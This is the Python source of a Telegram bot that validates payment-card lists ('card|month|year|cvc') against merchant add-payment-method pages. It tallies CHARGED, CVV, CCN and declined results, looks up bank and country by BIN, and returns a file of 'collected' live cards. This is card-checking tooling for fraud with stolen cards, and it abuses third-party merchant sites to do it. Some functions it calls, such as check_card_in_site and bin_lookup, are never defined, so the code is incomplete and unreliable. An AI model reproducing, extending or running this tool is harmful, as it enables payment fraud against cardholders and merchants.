import asyncio
import tempfile
import os
import re

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

from telegram.helpers import escape_markdown

from config import TELEGRAM_BOT_TOKEN, MAX_WORKERS, DEFAULT_API_URL
from auth_processor import (
    generate_uuids, prepare_headers,
    process_single_card_for_site, send_telegram_message
)

SITE_STORAGE_FILE = "sites.txt"

def save_sites(sites):
    with open(SITE_STORAGE_FILE, "w", encoding="utf-8") as f:
        for site in sites:
            f.write(site.strip() + "\n")


def load_sites():
    try:
        with open(SITE_STORAGE_FILE, "r", encoding="utf-8") as f:
            sites = [line.strip() for line in f if line.strip()]
            return sites or [DEFAULT_API_URL]
    except FileNotFoundError:
        return [DEFAULT_API_URL]


def build_status_keyboard(card, total, processed, status, charged, cvv, ccn, low, declined):
    # Do NOT escape card here, keep raw for display clarity
    keyboard = [
        [InlineKeyboardButton(f"• {card} •", callback_data="noop")],
        [InlineKeyboardButton(f"• STATUS ➔ {status} •", callback_data="noop")],
        [InlineKeyboardButton(f"• CHARGED ➔ {charged} •", callback_data="noop")],
        [InlineKeyboardButton(f"• CVV ➔ {cvv} •", callback_data="noop")],
        [InlineKeyboardButton(f"• CCN ➔ {ccn} •", callback_data="noop")],
        [InlineKeyboardButton(f"• LOW ➔ {low} •", callback_data="noop")],
        [InlineKeyboardButton(f"• DECLINED ➔ {declined} •", callback_data="noop")],
        [InlineKeyboardButton(f"• TOTAL ➔ {total} •", callback_data="noop")],
        [InlineKeyboardButton("✅ STOP", callback_data="stop")],
    ]
    return InlineKeyboardMarkup(keyboard)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "Send me a .txt file with one card per line in the format:\n"
        "`card|month|year|cvc`\n"
        "Example:\n"
        "`4242424242424242|12|2025|123`"
    )
    # Escape message only here as it's markdown
    await update.message.reply_markdown_v2(escape_markdown(msg, version=2))


async def site(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Replace Sites", callback_data="replace_site")],
    ]
    await update.message.reply_text("Do you want to replace sites?", reply_markup=InlineKeyboardMarkup(keyboard))


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "replace_site":
        await query.message.reply_text(
            "Please send site URLs one per line or together in message:\n"
            "SITE: https://example.com/my-account/add-payment-method/\n"
            "Or just direct URLs."
        )
        context.user_data["awaiting_sites"] = True

    elif query.data == "stop":
        context.bot_data["stop"] = True
        await query.message.reply_text("Stop command received, will halt after current card.")


async def capture_sites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get("awaiting_sites"):
        return
    text = update.message.text

    urls = set(re.findall(r"(https?://[^\s]+)", text))
    if not urls:
        await update.message.reply_text("No valid URLs found, please try again.")
        return

    save_sites(list(urls))
    context.user_data["awaiting_sites"] = False
    await update.message.reply_text(f"Saved {len(urls)} sites.")


async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "Usage: /chk <card> <month|year> <cvc>\nExample:\n"
            "/chk 4242424242424242 12|25 123"
        )
        return

    card = args[0]
    expiry = args[1]
    cvc = args[2]

    if "|" not in expiry:
        await update.message.reply_text("Expiry must be in MM|YY or MM|YYYY format.")
        return

    card_data = f"{card}|{expiry}|{cvc}"
    sites = load_sites()

    headers = prepare_headers()
    uuids = generate_uuids()
    chat_id = update.effective_chat.id
    bot_token = context.bot.token

    loop = asyncio.get_running_loop()

    status, msg = await loop.run_in_executor(
        None,
        check_card_in_site,
        card_data,
        headers,
        uuids,
        chat_id,
        bot_token,
        sites,
    )
    # Send as plain text to avoid escape chars
    await update.message.reply_text(msg)


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc or not doc.file_name.endswith(".txt"):
        await update.message.reply_text("Please send a .txt file with card details only.")
        return

    file = await doc.get_file()
    path = os.path.join(tempfile.gettempdir(), doc.file_name)
    await file.download_to_drive(path)

    with open(path) as f:
        cards = [line.strip() for line in f if line.strip()]
    if not cards:
        await update.message.reply_text("File empty or invalid.")
        return

    prepping_msg = await update.message.reply_text("Starting... please wait")
    await asyncio.sleep(1)
    await prepping_msg.delete()

    total = len(cards)
    counts = {"charged": 0, "cvv": 0, "ccn": 0, "low": 0, "declined": 0}
    collected = []

    reply_msg = await update.message.reply_text(
        f"Processing 0/{total}",
        reply_markup=build_status_keyboard("", total, 0, "Idle",
                                          counts["charged"], counts["cvv"],
                                          counts["ccn"], counts["low"],
                                          counts["declined"])
    )

    headers = prepare_headers()
    uuids = generate_uuids()
    chat_id = update.effective_chat.id
    bot_token = context.bot.token
    context.bot_data["stop"] = False

    for idx, card in enumerate(cards, 1):
        if context.bot_data["stop"]:
            await update.message.reply_text(f"Stopped processing at card {idx}.")
            break

        res, msg, raw = await asyncio.get_running_loop().run_in_executor(
            None,
            check_card_in_site,
            card,
            headers,
            uuids,
            chat_id,
            bot_token,
            load_sites(),
        )

        if res == "CHARGED":
            counts["charged"] += 1
        elif res == "CVV":
            counts["cvv"] += 1
            collected.append(f"{raw} | CVV")
        elif res == "CCN":
            counts["ccn"] += 1
            collected.append(f"{raw} | CCN")
        elif res == "LOW":
            counts["low"] += 1
        else:
            counts["declined"] += 1

        if res != "DECLINED":
            try:
                bin_info, bank, country = bin_lookup(raw.split("|")[0])
            except Exception:
                bin_info, bank, country = "Unknown", "Unknown", "Unknown"

            text_msg = (
                f"Card: {raw}\n"
                f"{msg}\n"
                f"Bin: {bin_info}\n"
                f"Bank: {bank}\n"
                f"Country: {country}\n"
            )
            await update.message.reply_text(text_msg)

        try:
            await reply_msg.edit_text(
                f"Processing {idx}/{total}",
                reply_markup=build_status_keyboard(
                    raw, total, idx, res,
                    counts["charged"], counts["cvv"],
                    counts["ccn"], counts["low"],
                    counts["declined"],
                ),
            )
        except:
            pass

    await update.message.reply_text("Processing complete.")

    if collected:
        out_file = os.path.join(tempfile.gettempdir(), "collected_cards.txt")
        with open(out_file, "w") as f:
            f.write("\n".join(collected))

        await update.message.reply_document(
            InputFile(out_file),
            filename="collected_cards.txt",
            caption="Collected CVV & CCN Cards"
        )


async def noop_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()


async def main_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.bot_data["stop"] = True
    await update.message.reply_text("Stopping after current card.")


def main():
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("site", site))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(CommandHandler("stop", main_stop))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, capture_sites))
    app.add_handler(CallbackQueryHandler(noop_handler, pattern="^noop$"))
    app.add_handler(CallbackQueryHandler(main_stop, pattern="^stop$"))

    print("Bot started...")
    app.run_polling()


if __name__ == "__main__":
    main()



